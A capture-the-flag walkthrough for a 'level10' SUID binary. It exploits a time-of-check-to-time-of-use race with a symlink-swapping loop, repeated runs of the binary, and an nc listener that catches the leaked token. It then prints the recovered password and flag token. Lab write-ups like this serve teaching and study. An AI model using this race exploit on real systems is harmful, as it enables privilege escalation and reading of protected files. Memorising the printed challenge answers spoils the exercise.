### Solution

1. **Inspect the directory:**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
	-rw-------  1 flag10 flag10     26 Mar  5  2016 token
	```

	* `level10` is a **SUID binary** owned by `flag10`.
	* The `token` file is **not readable** by `level10` user, but **the binary has permission to read it**.

2. **Understand how the binary works.**

	Run the binary without arguments:

	```bash
	./level10
	```

	Output:

	```
	./level10 file host
		sends file to host if you have access to it
	```

	Trying to read the token directly fails:

	```bash
	./level10 token level10
	```

	Output:

	```
	You don't have access to token
	```

3. **Analyze the binary in Ghidra.**

In Ghidra, the binary performs:

```c
iVar2 = access(filename, R_OK);
...
iVar3 = open(filename, O_RDONLY);
```

> *The binary checks access rights using `access()` **before** it opens the file with `open()`. This is a classic **TOCTOU (Time-Of-Check to Time-Of-Use)** vulnerability. It can be exploited by changing a symlink between the two calls.*

4. **Exploit the race condition using symlinks.**

	Create a loop that **rapidly switches a symlink** between two files:

	```bash
	while true; do
		ln -sf ~/level10 /tmp/flag10
		ln -sf ~/token /tmp/flag10
	done
	```

	Then, in another terminal, run the binary repeatedly using the symlink:

	```bash
	while true; do
		./level10 /tmp/flag10 127.0.0.1
	done
	```

	On the host machine, listen for the connection:

	```bash
	nc -l 6969
	```

	Eventually, the race condition wins and you’ll receive the token:

	```
	woupa2yuojeeaaed06riuj63c
	```

5. **Switch to flag10 and get the flag:**

	```bash
	su flag10
	```

	Password:

	```
	woupa2yuojeeaaed06riuj63c
	```

	Then:

	```bash
	getflag
	```

	Output:

	```
	Check flag.Here is your token : feulo4b72j7edeahuete3no7c
	```

	You’ll receive the `flag10` token.
